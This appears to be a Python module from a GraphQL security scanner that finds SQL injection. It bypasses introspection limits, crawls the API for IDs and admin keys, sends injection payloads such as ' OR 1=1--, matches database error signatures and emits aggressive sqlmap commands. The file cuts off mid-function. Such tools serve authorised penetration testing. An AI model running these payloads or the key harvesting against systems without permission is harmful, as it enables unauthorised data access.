#!/usr/bin/env python3
from __future__ import annotations
import re
import json
import base64
import hashlib
import argparse
import os
import time
import sys
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Set, Tuple, Union
from urllib.parse import urlparse
from pathlib import Path
from itertools import product

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import requests
import core.introspection as core_intro
from core.output import Fore, Style
from core.http import parse_headers_input

# SQLi payloads — string context (String / ID GraphQL args)
PAYLOADS = [
    '" OR "1"="1',
    "' OR '1'='1",
    "' OR 1=1--",
    "admin' -- ",
    "x' UNION SELECT NULL-- ",
    '"\' OR 1=1 -- ',
    "'",
    "admin'/*",
    'admin"/*',
]

# Ordered: specific / high-confidence first, broad patterns last.
SQL_ERROR_SIGS = [
    re.compile(r"you have an error in your sql syntax", re.I),
    re.compile(r"near .+ syntax error|syntax error .+ near", re.I),   # SQLite/MySQL "near X: syntax error"
    re.compile(r"unterminated quoted string", re.I),                   # PostgreSQL
    re.compile(r"ORA-\d{4,5}", re.I),                                  # Oracle
    re.compile(r"unclosed quotation mark", re.I),                      # MSSQL
    re.compile(r"invalid column name", re.I),                          # MSSQL
    re.compile(r"microsoft.*?odbc.*?sql|sql.*?odbc.*?microsoft", re.I),
    re.compile(r"sqlexception", re.I),                                 # Java JDBC
    re.compile(r"sqlstate", re.I),
    re.compile(r"sqlalchemy", re.I),                                   # Python SQLAlchemy exceptions
    re.compile(r"sqlite3?\.", re.I),                                   # Python sqlite3 exception class names
    re.compile(r"pymysql", re.I),
    re.compile(r"psycopg", re.I),
    re.compile(r"pg_query\(", re.I),
    re.compile(r"column .+ does not exist", re.I),                     # PostgreSQL
    re.compile(r"sql server", re.I),
    # Broad patterns — kept for flexibility but ranked last
    re.compile(r"mariadb", re.I),
    re.compile(r"mysql", re.I),
    re.compile(r"postgres", re.I),
    re.compile(r"sqlite", re.I),
]

TIMEOUT = 20
REPRO_DIR = "repro-payloads"
INDEX_FILE = "index.json"
EVIDENCE_MAX_CHARS = 80

# TypeMap alias: a pre-built {name: type_def} dict for O(1) lookup.
# Functions accept either a list (schema_types) or dict (type_map).
_TypeRef = Union[List[Dict[str, Any]], Dict[str, Dict[str, Any]]]

# -------------------- Utilities -------------------------------------------

def post_graphql(endpoint: str, headers: Dict[str, str], payload: Dict[str, Any], verbose: bool = False) -> Dict[str, Any]:
    h = {"Content-Type": "application/json"}
    h.update(headers or {})
    if verbose:
        q = payload.get("query") if isinstance(payload, dict) else str(payload)
        print(Fore.BLUE + Style.DIM + "[>] POST " + endpoint + " BODY: " + Style.RESET_ALL + (q[:800] + "..." if len(q) > 800 else q))
    try:
        r = requests.post(endpoint, json=payload, headers=h, timeout=TIMEOUT)
        try:
            data = r.json()
        except Exception:
            data = {"_raw_text": r.text}
        return {"status": r.status_code, "data": data}
    except requests.RequestException as e:
        return {"status": 0, "data": {"errors": [{"message": str(e)}]}}

def extract_named_type(t: Optional[Dict[str, Any]]) -> Optional[str]:
    if not t:
        return None
    if t.get("name"):
        return t.get("name")
    if t.get("ofType"):
        return extract_named_type(t.get("ofType"))
    return None

def is_string_type(arg_type_name: Optional[str]) -> bool:
    if not arg_type_name:
        return False
    return arg_type_name.lower() in ("string", "id", "varchar", "text")

def find_type_definition(schema_types: _TypeRef, name: Optional[str]) -> Optional[Dict[str, Any]]:
    """Locate a type definition by name.

    Accepts either a list of type dicts (O(n)) or a pre-built {name: def}
    dict (O(1)). Build the dict once with _build_type_map() for hot paths.
    """
    if not name:
        return None
    if isinstance(schema_types, dict):
        return schema_types.get(name)
    for t in schema_types:
        if t.get("name") == name:
            return t
    return None

def _build_type_map(types: List[Dict[str, Any]]) -> Dict[str, Dict[str, Any]]:
    return {t["name"]: t for t in types if isinstance(t, dict) and t.get("name")}

def pick_scalar_field_for_type(type_def: Optional[Dict[str, Any]], schema_types: _TypeRef) -> Optional[str]:
    if not type_def or not type_def.get("fields"):
        return None
    for f in type_def.get("fields", []):
        tname = extract_named_type(f.get("type"))
        if not tname:
            continue
        if tname.lower() in ("string", "int", "float", "boolean", "id", "integer"):
            return f.get("name")
        td = find_type_definition(schema_types, tname)
        if not td or not td.get("fields"):
            return f.get("name")
    return None

def normalize_resp(data: Any) -> str:
    try:
        return json.dumps(data, sort_keys=True, ensure_ascii=False)
    except Exception:
        return str(data)

def truncate_str(s: str, n: int = 180) -> str:
    if s is None:
        return ""
    s = str(s)
    return s if len(s) <= n else s[:n] + "..."

def build_query(field_name: str, args_dict: Dict[str, str], selection: Optional[str]) -> Dict[str, Any]:
    if args_dict:
        args_str = ", ".join([f'{k}: {json.dumps(v)}' for k, v in args_dict.items()])
        q = f'query {{ {field_name}({args_str}) {{ {selection} }} }}' if selection else f'query {{ {field_name}({args_str}) }}'
    else:
        q = f'query {{ {field_name} {{ {selection} }} }}' if selection else f'query {{ {field_name} }}'
    return {"query": q}

def _sanitize_name(s: str) -> str:
    return re.sub(r"[^\w\-]+", "_", s)[:64]

def _write_raw_http(endpoint: str, headers: Dict[str, str], body_json: Dict[str, Any], fname: str) -> str:
    repro_dir = Path.cwd() / REPRO_DIR
    repro_dir.mkdir(parents=True, exist_ok=True)
    parsed = urlparse(endpoint)
    path = parsed.path or "/"
    if parsed.query:
        path = path + "?" + parsed.query
    hdrs: Dict[str, str] = {"Host": parsed.netloc}
    for k, v in (headers or {}).items():
        if k.lower() == "host":
            hdrs["Host"] = v
        else:
            hdrs[k] = v
    if not any(k.lower() == "content-type" for k in hdrs):
        hdrs["Content-Type"] = "application/json"
    body_str = json.dumps(body_json, ensure_ascii=False)
    fpath = repro_dir / fname
    lines = [f"POST {path} HTTP/1.1"] + [f"{k}: {v}" for k, v in hdrs.items()] + ["", body_str]
    with open(fpath, "w", encoding="utf-8") as fh:
        fh.write("\r\n".join(lines) + "\r\n")
    return str(fpath)

def _read_index() -> Dict[str, Any]:
    idx_path = Path(REPRO_DIR) / INDEX_FILE
    if not idx_path.exists():
        return {}
    try:
        with open(idx_path, "r", encoding="utf-8") as fh:
            return json.load(fh)
    except Exception:
        return {}

def _write_index(idx: Dict[str, Any]) -> None:
    idx_path = Path(REPRO_DIR)
    idx_path.mkdir(parents=True, exist_ok=True)
    with open(idx_path / INDEX_FILE, "w", encoding="utf-8") as fh:
        json.dump(idx, fh, ensure_ascii=False, indent=2)

# -------------------- Crawling / extraction --------------------------------

def seed_field_queries(field: Dict[str, Any], type_ref: _TypeRef,
                       page_sizes: List[int], max_items: int) -> List[str]:
    fname = field.get("name")
    return_type_name = extract_named_type(field.get("type"))
    ret_def = find_type_definition(type_ref, return_type_name)
    scalars = []
    if ret_def and ret_def.get("fields"):
        for f in ret_def.get("fields", [])[:20]:
            fn = f.get("name")
            if fn and not fn.startswith("__"):
                scalars.append(fn)
    if not scalars:
        scalars = ["__typename"]
    selection = " ".join(scalars[:8])
    queries = [f'query {{ {fname} {{ {selection} }} }}']
    for n in page_sizes:
        queries.append(f'query {{ {fname}(first: {n}) {{ edges {{ node {{ {selection} }} }} }} }}')
    for n in page_sizes:
        queries.append(f'query {{ {fname}(first: {n}) {{ {selection} }} }}')
    return queries

def get_field_from_response(resp_data: Any, field_name: str) -> Any:
    if not resp_data:
        return None
    if isinstance(resp_data, dict):
        if "data" in resp_data and isinstance(resp_data["data"], dict):
            return resp_data["data"].get(field_name)
        if field_name in resp_data:
            return resp_data.get(field_name)
    return None

def _pretty_print_extracted_values(extracted_values: Dict[str, Set[str]], key_roles: Dict[str, str], max_per_key: int = 6):
    if not extracted_values and not key_roles:
        print(Fore.YELLOW + "[*] No extracted values found.")
        return
    print(Fore.CYAN + "[*] Extracted values (sample):")
    if key_roles:
        print(Fore.MAGENTA + "  Key -> role mappings:")
        for k, r in list(key_roles.items())[:10]:
            print(Fore.MAGENTA + f"    {k} -> {r}")
    if extracted_values:
        print(Fore.CYAN + "  Field -> values:")
        for key in sorted(extracted_values.keys()):
            sample = list(extracted_values[key])[:max_per_key]
            print(Fore.CYAN + f"    {key}: " + Fore.WHITE + f"{json.dumps(sample, ensure_ascii=False)}" + Style.RESET_ALL)

def try_decode_global_id(val: str) -> Optional[Tuple[str, str]]:
    if not isinstance(val, str) or len(val) < 8:
        return None
    if not re.fullmatch(r'[A-Za-z0-9+/=]+', val):
        return None
    try:
        decoded = base64.b64decode(val + '===').decode('utf-8', errors='ignore')
    except Exception:
        return None
    if ':' in decoded:
        parts = decoded.split(':', 1)
        return parts[0].strip(), parts[1].strip()
    return None

def simple_name_match_values(arg_name: str, extracted_values: Dict[str, Set[str]]) -> List[str]:
    an = (arg_name or "").lower()
    if an in extracted_values:
        return list(extracted_values[an])[:5]
    candidates = []
    for k, vals in extracted_values.items():
        kn = k.lower()
        if an in kn or kn in an:
            candidates.extend(list(vals)[:3])
    if 'key' in an and 'key' in extracted_values:
        candidates = list(extracted_values['key'])[:5] + candidates
    if 'token' in an and 'token' in extracted_values:
        candidates = list(extracted_values['token'])[:5] + candidates
    seen: Set[str] = set()
    res = []
    for v in candidates:
        if v not in seen:
            res.append(v)
            seen.add(v)
        if len(res) >= 5:
            break
    return res

def _collect_key_roles(rdata: Any, key_roles: Dict[str, str], max_items: int) -> None:
    """Extract key→role mappings from a crawled response value."""
    items: List[Any] = rdata if isinstance(rdata, list) else ([rdata] if isinstance(rdata, dict) else [])
    for it in items[:max_items]:
        if isinstance(it, dict):
            key = it.get("key") or it.get("apiKey") or it.get("token")
            role = it.get("role")
            if key and role:
                key_roles[key] = role

def crawl_and_extract_values(endpoint: str,
                              headers: Dict[str, str],
                              query_fields: List[Dict[str, Any]],
                              types: List[Dict[str, Any]],
                              max_depth: int = 2,
                              max_requests: int = 250,
                              max_items_per_list: int = 10,
                              delay: float = 0.0,
                              verbose: bool = False) -> Tuple[Dict[str, Set[str]], Dict[str, str]]:
    """Crawl argument-less query fields to seed argument values for SQLi testing."""
    print(Fore.CYAN + "[*] Crawling schema to extract values for candidate inputs...")
    type_map = _build_type_map(types)
    extracted_values: Dict[str, Set[str]] = {}
    key_roles: Dict[str, str] = {}
    requests_made = 0
    visited: Set[Tuple[str, str]] = set()
    page_sizes = [10, 50, 100]

    def collect(obj: Any, prefix: Optional[str] = None):
        if isinstance(obj, dict):
            if 'edges' in obj and isinstance(obj['edges'], list):
                for e in obj['edges'][:max_items_per_list]:
                    if isinstance(e, dict) and 'node' in e:
                        collect(e['node'], prefix)
                return
            for k, v in obj.items():
                if k.startswith("__"):
                    continue
                if isinstance(v, str) and v:
                    extracted_values.setdefault(k, set()).add(v)
                elif isinstance(v, list):
                    for it in v[:max_items_per_list]:
                        collect(it, prefix=k)
                elif isinstance(v, dict):
                    collect(v, prefix=k)
        elif isinstance(obj, list):
            for it in obj[:max_items_per_list]:
                collect(it, prefix=prefix)

    for field in query_fields:
        if requests_made >= max_requests:
            break
        fname = field.get("name")
        if not fname or fname.startswith("__"):
            continue
        if field.get("args"):
            continue
        for q in seed_field_queries(field, type_map, page_sizes, max_items_per_list):
            if requests_made >= max_requests:
                break
            if verbose:
                print(Fore.BLUE + "[>] Seed query: " + truncate_str(q, 800))
            resp = post_graphql(endpoint, headers, {"query": q}, verbose=verbose)
            requests_made += 1
            rdata = get_field_from_response(resp.get("data"), fname)
            if rdata:
                collect(rdata)
                _collect_key_roles(rdata, key_roles, max_items_per_list)
            if delay and requests_made < max_requests:
                time.sleep(delay)

    # Decode base64 / Relay global IDs to surface numeric IDs
    added_decoded = 0
    for key, vals in list(extracted_values.items()):
        for v in list(vals)[:200]:
            d = try_decode_global_id(v)
            if d:
                typ, idv = d
                extracted_values.setdefault("id", set()).add(idv)
                extracted_values.setdefault(f"{typ.lower()}Id", set()).add(idv)
                added_decoded += 1
    if added_decoded:
        print(Fore.GREEN + f"[+] Decoded {added_decoded} global/base64 id(s)")

    # BFS: follow fields that accept id-like args using the extracted IDs
    depth = 0
    while depth < max_depth and requests_made < max_requests:
        progress = False
        id_candidates: List[str] = list(extracted_values.get("id", []))
        for k in list(extracted_values.keys()):
            if k.lower().endswith("id") and k.lower() != "id":
                id_candidates.extend(list(extracted_values[k])[:50])
        for vals in extracted_values.values():
            for v in list(vals)[:50]:
                if try_decode_global_id(v):
                    id_candidates.append(v)
        id_candidates = list(dict.fromkeys(id_candidates))[:500]

        for field in query_fields:
            if requests_made >= max_requests:
                break
            fname = field.get("name")
            if not fname or fname.startswith("__"):
                continue
            args = field.get("args") or []
            if not args:
                continue
            id_arg_names = [a.get("name") for a in args if a.get("name") and 'id' in a.get("name").lower()]
            if not id_arg_names:
                continue
            candidates_per_arg = []
            for an in id_arg_names:
                vals = list(extracted_values.get(an, []))[:6] or id_candidates[:6] or ["1"]
                candidates_per_arg.append(vals)
            combos = []
            for prod in product(*candidates_per_arg):
                args_dict = {id_arg_names[i]: prod[i] for i in range(len(id_arg_names))}
                ahash = hashlib.sha1(json.dumps({"f": fname, "args": args_dict}, sort_keys=True).encode()).hexdigest()
                if (fname, ahash) not in visited:
                    combos.append((args_dict, ahash))
                if len(combos) >= 6:
                    break
            for args_dict, ahash in combos:
                if requests_made >= max_requests:
                    break
                visited.add((fname, ahash))
                return_type_name = extract_named_type(field.get("type"))
                ret_def = type_map.get(return_type_name)
                sel = None
                if ret_def and ret_def.get("fields"):
                    sel = pick_scalar_field_for_type(ret_def, type_map) or ret_def["fields"][0].get("name")
                q_str = (build_query(fname, args_dict, sel) or {}).get("query", "")
                if verbose:
                    print(Fore.BLUE + "[>] Follow query: " + truncate_str(q_str, 800))
                resp = post_graphql(endpoint, headers, {"query": q_str}, verbose=verbose)
                requests_made += 1
                progress = True
                rdata = get_field_from_response(resp.get("data"), fname)
                if rdata:
                    collect(rdata)
                    _collect_key_roles(rdata, key_roles, max_items_per_list)
                if delay and requests_made < max_requests:
                    time.sleep(delay)
        if not progress:
            break

        new_decoded = 0
        for key, vals in list(extracted_values.items()):
            for v in list(vals)[:200]:
                d = try_decode_global_id(v)
                if d:
                    typ, idv = d
                    if idv not in extracted_values.get("id", set()):
                        extracted_values.setdefault("id", set()).add(idv)
                        extracted_values.setdefault(f"{typ.lower()}Id", set()).add(idv)
                        new_decoded += 1
        if new_decoded:
            print(Fore.GREEN + f"[+] Decoded {new_decoded} additional global/base64 id(s)")
        depth += 1

    total_vals = sum(len(v) for v in extracted_values.values())
    if total_vals:
        print(Fore.GREEN + f"[+] Crawled and extracted {total_vals} values from {len(extracted_values)} distinct keys (requests made: {requests_made})")
    if key_roles:
        print(Fore.GREEN + f"[+] Found {len(key_roles)} key->role mappings during crawl")
    _pretty_print_extracted_values(extracted_values, key_roles)
    return extracted_values, key_roles

# -------------------- Grouping & printing (left-aligned compact) -----------

def group_findings_by_param(findings: List[Dict[str, Any]], endpoint: str) -> Dict[str, Any]:
    grouped: Dict[str, Any] = {}
    for f in findings:
        param = f.get("arg") or "unknown"
        field = f.get("field") or ""
        args_context = dict(f.get("args_used") or {})
        args_context.pop(param, None)
        payload = f.get("payload")
        evidence_type = f.get("type") or ""
        evidence_text = f.get("evidence") or ""
        repro = f.get("repro") or ""
        recommended_cmd = f.get("recommended_cmd") or (_build_sqlmap_cmd_marker(repro) if repro else "")
        timestamp = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
        confidence = compute_confidence(evidence_type, payload or "", bool(repro))
        occ_list = grouped.setdefault(param, {"occurrences": {}, "aggregate": {}})
        occ_key = f"{field} @ {endpoint}"
        occ = occ_list["occurrences"].setdefault(occ_key, {"field": field, "endpoint": endpoint, "args_context": args_context, "findings": []})
        occ["findings"].append({
            "payload": payload,
            "evidence_type": evidence_type,
            "evidence": evidence_text,
            "attack_response": truncate_str(str(f.get("attack_response")), 1000),
            "base_response": truncate_str(str(f.get("base_response")), 1000),
            "repro": repro,
            "recommended_cmd": recommended_cmd,
            "timestamp": timestamp,
            "confidence": confidence,
            "args_used": f.get("args_used")
        })
    for param, data in list(grouped.items()):
        occs = []
        all_payloads: Set = set()
        max_conf = 0.0
        for v in data["occurrences"].values():
            occs.append(v)
            for fin in v.get("findings", []):
                all_payloads.add(fin.get("payload"))
                if fin.get("confidence", 0) > max_conf:
                    max_conf = fin.get("confidence", 0)
        data["occurrences"] = occs
        data["aggregate"] = {
            "unique_payloads": len(all_payloads),
            "total_evidences": sum(len(o.get("findings", [])) for o in occs),
            "max_confidence": max_conf,
            "fields_affected": len(occs),
            "severity": "high" if max_conf >= 0.75 else "medium" if max_conf >= 0.45 else "low",
            "notes": ""
        }
    return grouped

def print_grouped_summary(grouped: Dict[str, Any]):
    if not grouped:
        return
    params = sorted(grouped.items(), key=lambda kv: (0 if kv[1].get("aggregate", {}).get("severity") == "high" else 1, kv[0]))
    print(Fore.MAGENTA + "\n[*] Findings grouped by vulnerable parameter:\n")
    for idx, (param, data) in enumerate(params, start=1):
        print(f"[{idx}] {Fore.RED}{param}{Style.RESET_ALL}")
        for occ in data.get("occurrences", []):
            for fin in occ.get("findings", []):
                payload = fin.get("payload")
                payload_display = payload if payload is not None else json.dumps(fin.get("args_used") or {}, ensure_ascii=False)
                print("  " + Fore.YELLOW + "Payload:  " + Style.RESET_ALL + f"{payload_display}")
                etype = fin.get("evidence_type") or ""
                print("  " + Fore.CYAN + "Type:     " + Style.RESET_ALL + etype)
                evidence = fin.get("evidence") or ""
                cleaned = re.sub(r"\s+", " ", evidence).strip()
                cleaned = re.sub(r"\[SQL: .*", "[SQL TRACE]", cleaned, flags=re.S)
                if len(cleaned) > EVIDENCE_MAX_CHARS:
                    cleaned = cleaned[:EVIDENCE_MAX_CHARS - 3].rstrip() + "..."
                    if re.search(r"\[SQL TRACE\]", evidence, flags=re.I) and "[SQL TRACE]" not in cleaned:
                        cleaned += " [SQL TRACE]"
                print("  " + Fore.BLUE + "Evidence: " + Style.RESET_ALL + cleaned)
                print("")
            first_repro = next((fin.get("repro") for fin in occ.get("findings", []) if fin.get("repro")), None)
            if first_repro:
                cmd = _build_sqlmap_cmd_marker(first_repro)
                print(Fore.MAGENTA + "Recommended sqlmap command:" + Style.RESET_ALL)
                print(Fore.MAGENTA + f"{cmd}" + Style.RESET_ALL)
            print("")

# -------------------- Detection flow (markers, checks) ---------------------

def _canonical_marker_key(endpoint: str, field: str, arg: str, context_args: Dict[str, Any]) -> str:
    arg_names = sorted(list(context_args.keys())) if isinstance(context_args, dict) else []
    return "|".join([endpoint, field, arg, ",".join(arg_names)])

def write_or_update_marker(endpoint: str, headers: Dict[str, str], attack_query: str,
                            field: str, arg: str, payload: str,
                            context_args: Dict[str, Any],
                            evidence_type: Optional[str], evidence_text: Optional[str]) -> str:
    escaped_payload = json.dumps(payload)
    escaped_marker = json.dumps("*")
    if escaped_payload in attack_query:
        marker_query = attack_query.replace(escaped_payload, escaped_marker, 1)
    elif payload in attack_query:
        # Payload appears unescaped — replace directly
        marker_query = attack_query.replace(payload, "*", 1)
    else:
        marker_query = attack_query  # Fallback: couldn't locate payload; keep as-is

    canonical = _canonical_marker_key(endpoint, field, arg, context_args or {})
    short_hash = hashlib.sha1(canonical.encode("utf-8")).hexdigest()[:8]
    filename = f"{_sanitize_name(field)}_{_sanitize_name(arg)}_{short_hash}_marker.http"

    repro_dir = Path(REPRO_DIR)
    repro_dir.mkdir(parents=True, exist_ok=True)
    marker_path = repro_dir / filename

    if not marker_path.exists():
        _write_raw_http(endpoint, headers, {"query": marker_query}, filename)

    idx = _read_index()
    entry = idx.get(filename) or {
        "endpoint": endpoint,
        "field": field,
        "arg": arg,
        "context_arg_names": sorted(list((context_args or {}).keys())),
        "evidences": []
    }

    ts = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    repro_rel = str(marker_path)
    recommended_cmd = _build_sqlmap_cmd_marker(repro_rel)

    evidence_record = {
        "payload": payload,
        "evidence_type": evidence_type or "",
        "evidence": evidence_text or "",
        "timestamp": ts,
        "repro": repro_rel,
        "recommended_cmd": recommended_cmd
    }

    if not any(e.get("payload") == payload and e.get("evidence") == evidence_text for e in entry.get("evidences", [])):
        entry.setdefault("evidences", []).append(evidence_record)
    idx[filename] = entry
    _write_index(idx)
    return str(marker_path)

def _build_sqlmap_cmd_marker(repro_marker_path: str) -> str:
    return (f"sqlmap --level 5 --risk 3 -r '{repro_marker_path}' "
            f"-p \"JSON[query]\" --batch --skip-urlencode --parse-errors --random-agent")

def check_sql_error_in_response(resp_data: Dict[str, Any]) -> Optional[Dict[str, str]]:
    """Check for SQL error signatures in the GraphQL errors array and in data string values.

    Some backends leak SQL errors inside the data payload rather than the errors array.
    """
    if not resp_data:
        return None

    # Primary: GraphQL errors array
    for e in (resp_data.get("errors") or []):
        msg = str(e.get("message", ""))
        for rx in SQL_ERROR_SIGS:
            if rx.search(msg):
                return {"evidence": msg, "pattern": rx.pattern}

    # Secondary: string values in the data field
    data = resp_data.get("data")
    if isinstance(data, dict):
        for v in data.values():
            if isinstance(v, str):
                for rx in SQL_ERROR_SIGS:
                    if rx.search(v):
                        return {"evidence": v, "pattern": rx.pattern}

    return None

def detect_missing_required_arg(resp_data: Dict[str, Any]) -> Optional[str]:
    if not resp_data:
        return None
    for e in (resp_data.get("errors") or []):
        msg = str(e.get("message", ""))
        m = re.search(r'argument\s+"([^"]+)"[^.]*required but not provided', msg, re.I)
        if m:
            return m.group(1)
    return None

def detect_graphql_syntax_error(resp_data: Dict[str, Any]) -> Optional[str]:
    if not resp_data:
        return None
    for e in (resp_data.get("errors") or []):
        msg = str(e.get("message", ""))
        if re.search(r"Syntax Error GraphQL|Syntax Error|Unexpected character|Expected :, found", msg, re.I):
            return msg
    return None

def compute_confidence(evidence_type: str, payload: str, has_repro: bool) -> float:
    weights = {
        "SQL_ERROR": 0.6,
        "SQL_ERROR_IN_RESPONSE": 0.6,
        "SQL_ERROR_IN_RESPONSE_SIMPLE": 0.6,
        "RESPONSE_DIFF": 0.2,
        "RESPONSE_DIFF_SIMPLE": 0.1,
        "NULL_ON_ATTACK": 0.15,
    }
    base = weights.get(evidence_type, 0.1)
    payload_bonus = 0.1 if payload and re.search(r"(\bOR\b|\bUNION\b|--|/\*|')", payload, re.I) else 0.0
    score = min(base + payload_bonus + (0.15 if has_repro else 0.0), 0.99)
    return round(score, 2)

# -------------------- Main detection logic --------------------------------

def run_detector(endpoint: str, headers: Dict[str, str], crawl: bool = False,
                 crawl_depth: int = 2, max_requests: int = 250, max_items: int = 10,
                 crawl_delay: float = 0.0, verbose: bool = False) -> List[Dict[str, Any]]:

    print(Fore.CYAN + f"[*] Running introspection on {endpoint}")

    # Use core introspection with automatic newline-bypass fallback
    _intro_headers = {"Content-Type": "application/json"}
    _intro_headers.update(headers or {})
    intro_data, strategy = core_intro.fetch_with_bypass(endpoint, _intro_headers, TIMEOUT)
    if intro_data is None:
        discovered = core_intro.find_graphql_endpoint(endpoint, _intro_headers, TIMEOUT)
        if discovered and discovered != endpoint:
            print(Fore.YELLOW + f"[!] Auto-discovered endpoint: {discovered}")
            endpoint = discovered
            intro_data, strategy = core_intro.fetch_with_bypass(endpoint, _intro_headers, TIMEOUT)
    if intro_data is None:
        print(Fore.YELLOW + "[!] All introspection strategies failed — attempting error-based reconstruction...")
        intro_data = core_intro.reconstruct_schema_from_errors(endpoint, _intro_headers, TIMEOUT, verbose=verbose)
        if intro_data is None:
            print(Fore.RED + "[!] Could not obtain schema.")
            return []
        strategy = "error-reconstruction"
    if strategy and strategy != "normal":
        print(Fore.YELLOW + f"[!] Introspection strategy used: {strategy}")

    schema = core_intro.extract_schema(intro_data)
    if not schema:
        print(Fore.RED + "[!] Could not extract '__schema' from introspection response.")
        return []

    types: List[Dict[str, Any]] = schema.get("types") or []
    type_map = _build_type_map(types)

    # Resolve the actual query type name — don't assume it's called "Query"
    query_type_name = (schema.get("queryType") or {}).get("name") or "Query"
    query_type = type_map.get(query_type_name)
    if not query_type or not query_type.get("fields"):
        print(Fore.RED + f"[!] Query type '{query_type_name}' not found in schema or has no fields.")
        return []

    query_fields: List[Dict[str, Any]] = query_type.get("fields", [])

    crawl_params = dict(
        max_depth=crawl_depth if crawl else 1,
        max_requests=max_requests if crawl else 50,
        max_items_per_list=max_items,
        delay=crawl_delay,
        verbose=verbose,
    )
    extracted_values, key_roles = crawl_and_extract_values(
        endpoint, headers, query_fields, types, **crawl_params
    )

    admin_keys = [k for k, r in key_roles.items() if isinstance(r, str) and 'admin' in r.lower()]
    if admin_keys:
        print(Fore.GREEN + f"[+] Prioritizing {len(admin_keys)} admin key(s) when filling key-like arguments")

    temp_findings: Dict[Tuple[str, str], List[Dict[str, Any]]] = {}

    for field in query_fields:
        args = field.get("args") or []
        if not args:
            continue
        field_name = field.get("name")
        if not field_name or field_name.startswith("__"):
            continue

        string_args = [a for a in args if is_string_type(extract_named_type(a.get("type")))]
        if not string_args:
            continue

        return_type_name = extract_named_type(field.get("type"))
        return_type_def = type_map.get(return_type_name)
        selection = pick_scalar_field_for_type(return_type_def, type_map)
        if not selection and return_type_def and return_type_def.get("fields"):
            fallback = next(
                (f for f in return_type_def["fields"] if f["name"] in ("id", "uuid", "username", "name", "title", "__typename")),
                None
            )
            if fallback:
                selection = fallback["name"]
        if not selection:
            selection = "__typename"

        base_values: Dict[str, List[str]] = {}
        for arg in args:
            an = arg.get("name")
            ev = list(extracted_values.get(an, []))[:8]
            if an and any(k in an.lower() for k in ("key", "apikey", "token")) and admin_keys:
                deduped: List[str] = []
                for k in admin_keys:
                    if k not in deduped:
                        deduped.append(k)
                for v in ev:
                    if v not in deduped:
                        deduped.append(v)
                ev = deduped[:8]
                if verbose:
                    print(Fore.YELLOW + f"[>] Using prioritized admin keys for argument '{an}': {ev[:3]}")
            if not ev:
                ev = simple_name_match_values(an, extracted_values)
            base_values[an] = ev if ev else (
                ["test", "admin", "test123"] if is_string_type(extract_named_type(arg.get("type"))) else ["1", "100"]
            )

        for target_arg in string_args:
            target_arg_name = target_arg.get("name")

            other_args = [a.get("name") for a in args if a.get("name") != target_arg_name]
            candidate_lists = [
                sorted(base_values.get(oname, ["test"]), key=lambda x: len(str(x)), reverse=True)[:3]
                for oname in other_args
            ]

            combos_to_try: List[Dict[str, str]] = []
            if candidate_lists:
                for combo in product(*candidate_lists):
                    args_dict = {other_args[i]: combo[i] for i in range(len(other_args))}
                    args_dict[target_arg_name] = "test"
                    combos_to_try.append(args_dict)
                    if len(combos_to_try) >= 6:
                        break
            else:
                combos_to_try.append({target_arg_name: "test"})

            working_args: Optional[Dict[str, str]] = None
            base_resp = None
            base_norm = None
            base_has_error = True
            for attempt_args in combos_to_try:
                base_q = build_query(field_name, attempt_args, selection).get("query", "")
                base_resp = post_graphql(endpoint, headers, {"query": base_q}, verbose=verbose)
                base_norm = normalize_resp(base_resp.get("data"))
                base_has_error = bool(base_resp.get("data", {}).get("errors"))
                if not base_has_error:
                    working_args = attempt_args.copy()
                    print(Fore.GREEN + Style.DIM + f"[+] Baseline for {field_name}.{target_arg_name} works with args: {attempt_args}")
                    break

            if not working_args:
                working_args = combos_to_try[0].copy() if combos_to_try else {target_arg_name: "test"}
                print(Fore.YELLOW + Style.DIM + f"[!] No clean baseline found for {field_name}.{target_arg_name}, using best-effort baseline: {working_args}")

            simple_q_base_str = build_query(field_name, {**working_args, target_arg_name: "test"}, "__typename").get("query", "")
            simple_base_resp = post_graphql(endpoint, headers, {"query": simple_q_base_str}, verbose=verbose)
            simple_base_norm = normalize_resp(simple_base_resp.get("data"))
            simple_field_value = get_field_from_response(simple_base_resp.get("data"), field_name)

            key = (field_name, target_arg_name)
            temp_findings.setdefault(key, [])

            # --- Primary payload loop (with working context args) ---
            for payload in PAYLOADS:
                attack_args = {**working_args, target_arg_name: payload}
                attack_q_str = build_query(field_name, attack_args, selection).get("query", "")
                attack_resp = post_graphql(endpoint, headers, {"query": attack_q_str}, verbose=verbose)

                if detect_graphql_syntax_error(attack_resp.get("data")):
                    continue

                missing_arg = detect_missing_required_arg(attack_resp.get("data"))
                if missing_arg:
                    candidate = (base_values.get(missing_arg) or [None])[0] or \
                                (simple_name_match_values(missing_arg, extracted_values) or [None])[0]
                    if candidate:
                        attack_args[missing_arg] = candidate
                        attack_q_str = build_query(field_name, attack_args, selection).get("query", "")
                        attack_resp = post_graphql(endpoint, headers, {"query": attack_q_str}, verbose=verbose)
                        if detect_graphql_syntax_error(attack_resp.get("data")):
                            continue
                    else:
                        continue

                sql_err = check_sql_error_in_response(attack_resp.get("data"))
                attack_norm = normalize_resp(attack_resp.get("data"))

                if sql_err:
                    marker_path = write_or_update_marker(
                        endpoint, headers, attack_q_str, field_name, target_arg_name, payload,
                        {k: v for k, v in attack_args.items() if k != target_arg_name},
                        "SQL_ERROR", sql_err.get("evidence"))
                    temp_findings[key].append({
                        "field": field_name, "arg": target_arg_name, "payload": payload,
                        "args_used": attack_args.copy(), "type": "SQL_ERROR",
                        "evidence": sql_err["evidence"],
                        "base_response": base_resp.get("data") if base_resp else None,
                        "attack_response": attack_resp.get("data"),
                        "recommended_cmd": _build_sqlmap_cmd_marker(marker_path),
                        "repro": marker_path,
                    })
                    continue

                if base_norm and attack_norm and base_norm != attack_norm and not base_has_error:
                    marker_path = write_or_update_marker(
                        endpoint, headers, attack_q_str, field_name, target_arg_name, payload,
                        {k: v for k, v in attack_args.items() if k != target_arg_name},
                        "RESPONSE_DIFF", "Baseline != Attack")
                    temp_findings[key].append({
                        "field": field_name, "arg": target_arg_name, "payload": payload,
                        "args_used": attack_args.copy(), "type": "RESPONSE_DIFF",
                        "evidence": "Baseline != Attack",
                        "base_response": base_resp.get("data") if base_resp else None,
                        "attack_response": attack_resp.get("data"),
                        "recommended_cmd": _build_sqlmap_cmd_marker(marker_path),
                        "repro": marker_path,
                    })
                    continue

                # Compare actual field values, not JSON-serialized strings
